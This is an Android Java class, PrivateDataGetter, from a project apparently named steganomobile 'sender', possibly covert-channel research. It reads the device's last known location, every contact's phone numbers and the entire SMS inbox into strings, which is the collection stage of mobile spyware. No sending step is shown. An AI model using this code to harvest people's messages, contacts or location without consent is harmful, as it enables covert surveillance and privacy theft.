package com.steganomobile.sender.controller;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.ContactsContract;

public class PrivateDataGetter {

    public static final String NOT_SPECIFIED = "NOT_SPECIFIED";
    private static final String TAG = PrivateDataGetter.class.getSimpleName();

    public static String getLocation(Context context) {
        LocationManager manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        StringBuilder b = new StringBuilder();
        for (String temp : manager.getProviders(true)) {
            if (manager.getLastKnownLocation(temp) == null) {
                continue;
            }
            b.append(temp.toUpperCase()).append(" Location");
            b.append("\nAltitude: ").append(manager.getLastKnownLocation(temp).getAltitude());
            b.append("\nLatitude: ").append(manager.getLastKnownLocation(temp).getLatitude());
            b.append("\nLongitude: ").append(manager.getLastKnownLocation(temp).getLongitude());
            b.append("\n");
        }
        return b.toString();
    }

    public static String getContactsList(Context context) {
        StringBuilder b = new StringBuilder();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        ContentResolver resolver = context.getContentResolver();
        if (uri == null) {
            return b.toString();
        }
        Cursor cursor = resolver.query(uri, null, null, null, null);
        if (cursor == null) {
            return b.toString();
        }
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                if (Integer.parseInt(cursor.getString(
                        cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                    if (phoneUri == null) {
                        continue;
                    }
                    Cursor phoneCursor = resolver.query(
                            phoneUri,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    if (phoneCursor == null) {
                        continue;
                    }
                    int i = 0;
                    b.append(cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));

                    while (phoneCursor.moveToNext()) {
                        b.append(" ").append(i).append(". ");
                        b.append(phoneCursor.getString(phoneCursor
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        i++;
                    }
                    b.append("\n");
                    phoneCursor.close();
                }
            }
        }
        cursor.close();
        return b.toString();
    }

    public static String getSms(Context context) {
        final Uri SMS_URI = Uri.parse("content://sms/inbox");
        Cursor cursor = context.getContentResolver().query(SMS_URI, null, null, null, null);
        StringBuilder b = new StringBuilder();
        if (cursor == null) {
            return "No data\n";
        }
        while (cursor.moveToNext()) {
            int bodyIndex = cursor.getColumnIndex("body");
            if (bodyIndex == -1) {
                continue;
            }
            String sms = "From :" + cursor.getString(2) + " : " + cursor.getString(bodyIndex) + "\n";
            b.append(sms);
        }
        cursor.close();
        return b.toString();
    }
}
